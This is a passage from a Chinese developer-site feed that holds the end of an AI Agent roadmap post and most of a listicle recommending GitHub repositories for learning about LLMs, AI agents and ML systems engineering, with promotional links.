<li>添加RAG提供专业知识；</li>
<li>探索多Agent协作场景。</li>
</ol>
<p>对于有经验的开发者，可以重点关注：</p>
<ul>
<li>高级规划与推理技术</li>
<li>多Agent系统架构</li>
<li>生产环境部署与监控</li>
<li>安全与合规框架。</li>
</ul>
<h2 data-id="heading-11">结语</h2>
<p>AI Agent技术正在快速发展，2025年将是关键的一年。随着技术的成熟和工具的完善，我们将看到越来越多强大的AI Agent应用于各行各业。</p>
<hr/>
<p>以上内容基于本人近期整理的一份AI Agent路线图文件，如有需要，请在“基线沉思”公众号回复“agent路线图”获取下载链接。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d67245d37d2f4e66b305b3c284759e2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941863&amp;x-signature=PqmN6CS2VNRFxcDMeCbRXGzC0v0%3D" alt="" loading="lazy"/></p>
<p>路线图json文件可以使用在线工具打开：<a href="https://link.juejin.cn?target=https%3A%2F%2Fexcalidraw.com%2F" target="_blank" title="https://excalidraw.com/" ref="nofollow noopener noreferrer">excalidraw.com</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/295ee9635adc4ad385fcb7c62b852267~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941863&amp;x-signature=FlX10zdIz2YmLUeJAeCe%2FyOMmcc%3D" alt="" loading="lazy"/></p>
<p>上图来自：<a href="https://link.juejin.cn?target=https%3A%2F%2Froadmap.sh%2Fai-agents%3Ffl%3D1" target="_blank" title="https://roadmap.sh/ai-agents?fl=1" ref="nofollow noopener noreferrer">roadmap.sh/ai-agents?f…</a></p>
<h2 data-id="heading-12">学习资源推荐</h2>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025年AI智能体开发完全指南：10个GitHub顶级教程资源助你从入门到精通]]></title>    <link>https://juejin.cn/post/7581752787564560424</link>    <guid>https://juejin.cn/post/7581752787564560424</guid>    <pubDate>2025-12-10T03:24:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581752787564560424" data-draft-id="7581765536372736009" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025年AI智能体开发完全指南：10个GitHub顶级教程资源助你从入门到精通"/> <meta itemprop="keywords" content="Agent,LLM,程序员"/> <meta itemprop="datePublished" content="2025-12-10T03:24:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI大模型"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025年AI智能体开发完全指南：10个GitHub顶级教程资源助你从入门到精通
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI大模型
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:24:44.000Z" title="Wed Dec 10 2025 03:24:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读24分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote>
<p>人工智能智能体（AI Agents）作为当前AI领域最具前沿性的技术方向，正在推动着自动化决策、多模态交互和复杂任务执行的革命性发展。本文精选了十个高质量的GitHub开源项目，涵盖从基础理论到实践应用的全方位学习路径，为AI开发者提供系统性的技术资源。</p>
<h2 data-id="heading-0">1、Hands-On Large Language Models - 大型语言模型实战指南</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FHandsOnLLM%2FHands-On-Large-Language-Models" target="_blank" title="https://github.com/HandsOnLLM/Hands-On-Large-Language-Models" ref="nofollow noopener noreferrer">github.com/HandsOnLLM/…</a></p>
<p><strong>⭐ Stars：</strong>  16.7k+ | <strong>📈 活跃度：</strong>  高 | <strong>🏷️ 主要语言：</strong>  Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dec7d5cca40f452999755b075ff20552~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=Mfod6R1Cx32fEXRIjRDSXF0TkXI%3D" alt="" loading="lazy"/></p>
<p>这是Jay Alammar和Maarten Grootendorst合著的《Hands-On Large Language Models》官方配套代码仓库，被誉为"图解版LLM教程"。项目提供了11个章节的完整学习体系，包含近300个定制图表和丰富的Jupyter Notebook实践案例。</p>
<h4 data-id="heading-1">技术特色</h4>
<ul>
<li><strong>可视化教学体系</strong>：通过近300个定制图表深入浅出地解释LLM核心概念m</li>
<li><strong>完整章节覆盖</strong>：从语言模型介绍、Token处理到高级微调技术的全栈学习路径</li>
<li><strong>Google Colab集成</strong>：所有示例均可在Google Colab上运行，支持T4 GPU免费使用</li>
<li><strong>多种微调技术</strong>：涵盖BERT微调、提示工程、语义搜索等前沿技术</li>
<li><strong>生产级实践</strong>：提供从模型训练到部署的完整工程化流程</li>
</ul>
<h4 data-id="heading-2">核心章节</h4>
<ol start="0">
<li><strong>语言模型基础</strong> - Pipeline创建和文本生成</li>
<li><strong>Token与嵌入</strong> - 分词器工作原理和向量表示</li>
<li><strong>文本分类</strong> - 情感分析和分类任务实现</li>
<li><strong>聚类与主题建模</strong> - 无监督学习应用</li>
<li><strong>提示工程</strong> - 高级提示技巧和策略</li>
<li><strong>语义搜索</strong> - 向量数据库和相似性检索</li>
<li><strong>BERT微调</strong> - 命名实体识别等下游任务</li>
</ol>
<h4 data-id="heading-3">适用场景</h4>
<ul>
<li>LLM算法工程师技能提升</li>
<li>企业级LLM应用开发</li>
<li>学术研究中的模型微调实验</li>
<li>AI产品经理技术理解需求</li>
</ul>
<hr/>
<h2 data-id="heading-4">2、AI Agents for Beginners - 微软官方AI智能体入门课程</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2Fai-agents-for-beginners" target="_blank" title="https://github.com/microsoft/ai-agents-for-beginners" ref="nofollow noopener noreferrer">github.com/microsoft/a…</a></p>
<p><strong>⭐ Stars：</strong>  5.2k+ | <strong>📈 活跃度：</strong>  高 | <strong>🏷️ 主要语言：</strong>  Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4a6309d68d54b3cb55a1ccee60e20ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=is%2FxabOytK7MLFToDZJaZrKStpM%3D" alt="" loading="lazy"/></p>
<p>微软官方推出的完整AI智能体学习课程，从零开始到实际部署的11章渐进式教程。该项目不仅提供理论基础，还包含丰富的实践项目和多语言支持。</p>
<h4 data-id="heading-5">课程结构</h4>
<ul>
<li><strong>智能体概念理解</strong>：定义AI智能体的核心组件（环境、传感器、执行器）</li>
<li><strong>智能体类型分类</strong>：简单反射、基于模型、目标导向、效用型、学习型和多智能体系统</li>
<li><strong>Azure AI服务集成</strong>：使用Azure AI Agent Service构建生产级智能体</li>
<li><strong>智能体设计模式</strong>：多步骤提示、协作模式和分布式智能体架构</li>
<li><strong>可信AI智能体</strong>：安全性、可控性和人机协作最佳实践</li>
</ul>
<h4 data-id="heading-6">技术栈特色</h4>
<ul>
<li><strong>Azure Cognitive Services</strong>：企业级AI服务集成</li>
<li><strong>OpenAI API</strong>：GPT模型集成和应用</li>
<li><strong>多框架支持</strong>：AutoGen、Semantic Kernel等主流框架</li>
<li><strong>实时学习能力</strong>：支持环境反馈和用户交互的持续改进</li>
</ul>
<h4 data-id="heading-7">实践应用场景</h4>
<ul>
<li><strong>开放式问题解决</strong>：LLM动态确定任务步骤</li>
<li><strong>多步骤复杂流程</strong>：需要多轮工具调用和信息处理</li>
<li><strong>智能体协作</strong>：多个智能体合作完成复杂任务</li>
</ul>
<h4 data-id="heading-8">教学特色</h4>
<ul>
<li>11个完整章节的渐进式学习</li>
<li>支持多种语言（中文、英文、德语等）</li>
<li>包含视频教程和交互式示例</li>
<li>Discord社区支持和答疑</li>
</ul>
<hr/>
<h2 data-id="heading-9">3、Agents Engineering Mastery - 企业级AI智能体工程实践</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fed-donner%2Fagents" target="_blank" title="https://github.com/ed-donner/agents" ref="nofollow noopener noreferrer">github.com/ed-donner/a…</a></p>
<p><strong>⭐ Stars：</strong>  1.8k+ | <strong>📈 活跃度：</strong>  极高 | <strong>🏷️ 主要语言：</strong>  Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7e9a97d74834d66a317d8e1cc164e2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=sfu9vyN6qKAGtW3AGaeDIURPkT0%3D" alt="" loading="lazy"/></p>
<p>这是一个为期6周的深度AI智能体工程课程，涵盖OpenAI Agents SDK、CrewAI、LangGraph、AutoGen和MCP等主流框架。专注于从原型到生产部署的完整工程化实践。</p>
<h4 data-id="heading-10">核心技术框架</h4>
<ul>
<li><strong>OpenAI Agents SDK</strong>：企业级智能体开发的官方工具</li>
<li><strong>CrewAI</strong>：多智能体协作和团队化工作流</li>
<li><strong>LangGraph</strong>：复杂智能体工作流的图形化编排</li>
<li><strong>AutoGen</strong>：微软的多智能体对话框架</li>
<li><strong>MCP (Model Context Protocol)</strong> ：模型上下文协议集成</li>
</ul>
<h4 data-id="heading-11">工程实践特色</h4>
<ul>
<li><strong>多云提供商支持</strong>：OpenAI、Groq、DeepSeek、Anthropic等多种API集成</li>
<li><strong>本地化部署</strong>：Ollama本地模型运行和GPU优化</li>
<li><strong>生产级架构</strong>：容器化部署、监控和日志管理</li>
<li><strong>成本优化策略</strong>：API使用监控和预算控制</li>
</ul>
<h4 data-id="heading-12">实战项目案例</h4>
<ul>
<li><strong>工程团队协作</strong>：包含设计师、开发者、测试工程师的多智能体团队</li>
<li><strong>金融分析师</strong>：股票数据分析和投资建议生成</li>
<li><strong>深度研究智能体</strong>：多阶段研究流程自动化</li>
<li><strong>项目规划助手</strong>：需求分析到技术实现的完整项目管理</li>
</ul>
<h4 data-id="heading-13">技术架构亮点</h4>
<ul>
<li><strong>分布式智能体运行时</strong>：支持SingleThreaded和分布式部署</li>
<li><strong>工具集成生态</strong>：文件管理、网络搜索、数据库操作等丰富工具</li>
<li><strong>多模态支持</strong>：文本、图像、音频的综合处理能力</li>
<li><strong>人机协作模式</strong>：Human-in-the-Loop工作流设计</li>
</ul>
<hr/>
<h2 data-id="heading-14">4、Awesome AI Applications - AI应用开发宝典</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FArindam200%2Fawesome-ai-apps" target="_blank" title="https://github.com/Arindam200/awesome-ai-apps" ref="nofollow noopener noreferrer">github.com/Arindam200/…</a></p>
<p><strong>⭐ Stars：</strong>  2.5k+ | <strong>📈 活跃度：</strong>  极高 | <strong>🏷️ 主要语言：</strong>  Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56722d9e4dd640b7943ffd8002ebdeab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=jpqTHxdb3quUiEWTwBgzDbAeZHw%3D" alt="" loading="lazy"/></p>
<p>一个全面的AI应用程序集合，涵盖从简单聊天机器人到复杂企业级智能体的完整开发教程。由Nebius AI Studio支持，提供100多个实用的AI应用示例。</p>
<h4 data-id="heading-15">项目分类体系</h4>
<h5 data-id="heading-16">🧩 入门级智能体</h5>
<ul>
<li><strong>Agno HackerNews分析器</strong>：基于Agno框架的科技新闻趋势分析</li>
<li><strong>OpenAI SDK助手</strong>：邮件处理和俳句创作智能体</li>
<li><strong>LlamaIndex任务管理器</strong>：任务调度和项目管理助手</li>
<li><strong>CrewAI研究团队</strong>：多智能体协作研究系统</li>
</ul>
<h5 data-id="heading-17">🪶 实用型智能体</h5>
<ul>
<li><strong>金融数据智能体</strong>：实时股票数据追踪和市场分析</li>
<li><strong>人机协作智能体</strong>：安全任务执行的HITL模式</li>
<li><strong>新闻通讯生成器</strong>：基于Firecrawl的AI新闻编辑器</li>
<li><strong>日历调度助手</strong>：与Cal.com集成的智能日程管理</li>
</ul>
<h5 data-id="heading-18">🔬 高级智能体系统</h5>
<ul>
<li><strong>深度研究智能体</strong>：多阶段研究工作流，集成Agno和Scrapegraph AI</li>
<li><strong>候选人分析器</strong>：GitHub和LinkedIn档案的智能化评估</li>
<li><strong>职位搜索智能体</strong>：基于Bright Data的LinkedIn职位匹配</li>
<li><strong>AI趋势分析器</strong>：使用Google ADK的趋势挖掘系统</li>
</ul>
<h4 data-id="heading-19">技术生态集成</h4>
<ul>
<li><strong>AI框架支持</strong>：Google ADK、OpenAI Agents SDK、LangChain、LlamaIndex等</li>
<li><strong>企业服务集成</strong>：Nebius AI Studio、Bright Data、Cal.com等</li>
<li><strong>多模态能力</strong>：文本生成、图像创作、数据可视化</li>
<li><strong>云原生架构</strong>：Docker容器化、API服务化部署</li>
</ul>
<h4 data-id="heading-20">工程化特色</h4>
<ul>
<li><strong>一键部署脚本</strong>：uvscript快速环境搭建</li>
<li><strong>详细文档支持</strong>：每个项目都有完整的README和使用说明</li>
<li><strong>视频教程配套</strong>：YouTube教程播放列表支持</li>
<li><strong>社区驱动开发</strong>：持续更新和社区贡献</li>
</ul>
<hr/>
<h2 data-id="heading-21">5、Made With ML - 生产级机器学习系统工程</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FGokuMohandas%2FMade-With-ML" target="_blank" title="https://github.com/GokuMohandas/Made-With-ML" ref="nofollow noopener noreferrer">github.com/GokuMohanda…</a></p>
<p><strong>⭐ Stars：</strong>  16.7k+ | <strong>📈 活跃度：</strong>  高 | <strong>🏷️ 主要语言：</strong>  Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/015264ffbffb4ccea01d3cfb246f5e75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=%2BngVK%2Fj8yPNN4zZbIarHZen7dWY%3D" alt="" loading="lazy"/></p>
<p>GitHub上顶级ML代码仓库之一，致力于教授如何设计、开发、部署和迭代生产级ML应用程序。40K+开发者参与学习，结合机器学习与软件工程最佳实践的综合平台。</p>
<h4 data-id="heading-22">核心工程架构</h4>
<h5 data-id="heading-23">🚀 完整MLOps工作流</h5>
<ul>
<li><strong>分布式训练框架</strong>：基于Ray的可扩展机器学习工作负载</li>
<li><strong>实验跟踪系统</strong>：MLflow集成的模型版本管理和性能监控</li>
<li><strong>自动化调优</strong>：超参数优化和模型选择自动化</li>
<li><strong>CI/CD集成</strong>：GitHub Actions驱动的持续集成和部署流水线</li>
</ul>
<h5 data-id="heading-24">🏗️ 生产级系统设计</h5>
<ul>
<li><strong>微服务架构</strong>：RESTful API和容器化模型服务</li>
<li><strong>在线推理优化</strong>：低延迟预测服务和批量处理支持</li>
<li><strong>监控与告警</strong>：实时性能监控和数据漂移检测</li>
<li><strong>A/B测试框架</strong>：模型效果评估和渐进式部署</li>
</ul>
<h4 data-id="heading-25">技术栈与工具链</h4>
<h5 data-id="heading-26">🔧 核心技术组件</h5>
<ul>
<li><strong>Ray生态系统</strong>：分布式计算、并行训练和超参数调优</li>
<li><strong>深度学习框架</strong>：PyTorch模型开发和微调</li>
<li><strong>特征工程</strong>：预处理管道和特征存储</li>
<li><strong>模型评估</strong>：多指标评估和基准测试</li>
</ul>
<h5 data-id="heading-27">📊 LLM基准测试</h5>
<ul>
<li><strong>零样本学习评估</strong>：GPT-3.5、GPT-4在监督学习任务上的性能对比</li>
<li><strong>少样本学习优化</strong>：上下文学习策略和提示工程</li>
<li><strong>开源模型对比</strong>：Falcon 40B、Llama 2等开源LLM性能分析</li>
<li><strong>微调vs提示学习</strong>：不同学习策略的成本效益分析</li>
</ul>
<h4 data-id="heading-28">实践应用价值</h4>
<h5 data-id="heading-29">💼 企业级部署</h5>
<ul>
<li><strong>可扩展基础设施</strong>：Anyscale云平台集成和本地部署支持</li>
<li><strong>成本优化策略</strong>：计算资源管理和自动伸缩</li>
<li><strong>安全合规</strong>：数据隐私保护和模型安全部署</li>
<li><strong>团队协作</strong>：多角色协作和权限管理</li>
</ul>
<h5 data-id="heading-30">🎯 学习路径设计</h5>
<ul>
<li><strong>理论与实践结合</strong>：从原理到生产的完整学习路径</li>
<li><strong>渐进式复杂度</strong>：从简单分类到复杂NLP任务</li>
<li><strong>工业标准流程</strong>：符合企业级ML开发标准</li>
<li><strong>社区驱动学习</strong>：活跃的技术社区和知识分享</li>
</ul>
<p><strong>最佳应用场景：</strong> 适合希望掌握端到端ML系统开发的工程师、数据科学家和技术团队。特别适用于需要将ML模型从实验阶段快速可靠地推向生产环境的企业项目。</p>
<hr/>
<h2 data-id="heading-31">6、Designing Machine Learning Systems - ML系统设计权威指南</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchiphuyen%2Fdmls-book" target="_blank" title="https://github.com/chiphuyen/dmls-book" ref="nofollow noopener noreferrer">github.com/chiphuyen/d…</a></p>
<p><strong>⭐ Stars：</strong>  8.6k+ | <strong>📈 活跃度：</strong>  稳定更新 | <strong>🏷️ 主要语言：</strong>  Markdown/Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/654c7ce0b8534e29a193a5434abdea21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=PJP05%2Bmlzxk4uyL3qvFRgV9MBXo%3D" alt="" loading="lazy"/></p>
<p>Chip Huyen所著《Designing Machine Learning Systems》的官方配套资源库，提供机器学习系统设计的系统性方法论。该书已被翻译成西班牙语、日语、韩语、波兰语和泰语等多种语言，是ML系统设计领域的权威参考。</p>
<h4 data-id="heading-32">核心设计理念</h4>
<h5 data-id="heading-33">🏛️ 系统设计四大支柱</h5>
<ul>
<li><strong>可靠性</strong>：容错机制、故障恢复和服务可用性保证</li>
<li><strong>可扩展性</strong>：水平扩展、负载均衡和分布式架构设计</li>
<li><strong>可维护性</strong>：模块化设计、代码质量和技术债务管理</li>
<li><strong>适应性</strong>：数据分布变化适应和业务需求演进支持</li>
</ul>
<h5 data-id="heading-34">📚 全生命周期覆盖</h5>
<ul>
<li><strong>第1-2章</strong>：ML系统概述和设计原则</li>
<li><strong>第3-5章</strong>：数据工程基础、训练数据和特征工程</li>
<li><strong>第6-7章</strong>：模型开发、评估和部署服务</li>
<li><strong>第8-9章</strong>：数据分布漂移、监控和持续学习</li>
<li><strong>第10-11章</strong>：MLOps基础设施和人文考量</li>
</ul>
<h4 data-id="heading-35">技术深度解析</h4>
<h5 data-id="heading-36">🔄 数据工程基础</h5>
<ul>
<li><strong>存储模式选择</strong>：行式vs列式存储，文本vs二进制格式对比</li>
<li><strong>数据模型设计</strong>：关系型、文档型、图形数据库的适用场景</li>
<li><strong>流式处理架构</strong>：实时数据处理和批处理系统集成</li>
<li><strong>数据质量保证</strong>：数据验证、清洗和血缘关系追踪</li>
</ul>
<h5 data-id="heading-37">🧠 模型开发与评估</h5>
<ul>
<li><strong>算法选择策略</strong>：基于约束条件的模型选择框架</li>
<li><strong>分布式训练</strong>：数据并行、模型并行和流水线并行技术</li>
<li><strong>模型集成方法</strong>：Bagging、Boosting和Stacking策略</li>
<li><strong>评估指标体系</strong>：业务指标vs技术指标的权衡</li>
</ul>
<h5 data-id="heading-38">🚀 部署与监控</h5>
<ul>
<li><strong>部署模式对比</strong>：在线预测vs批量预测，云端vs边缘部署</li>
<li><strong>推理优化</strong>：模型压缩、量化和硬件加速</li>
<li><strong>监控体系</strong>：运维指标、ML特定指标和性能监控</li>
<li><strong>数据漂移检测</strong>：协变量漂移、标签漂移和概念漂移</li>
</ul>
<h4 data-id="heading-39">资源生态系统</h4>
<h5 data-id="heading-40">📖 学习资源</h5>
<ul>
<li><strong>章节总结</strong>：每章核心概念和关键要点梳理</li>
<li><strong>MLOps工具清单</strong>：开源工具分类和选型指南</li>
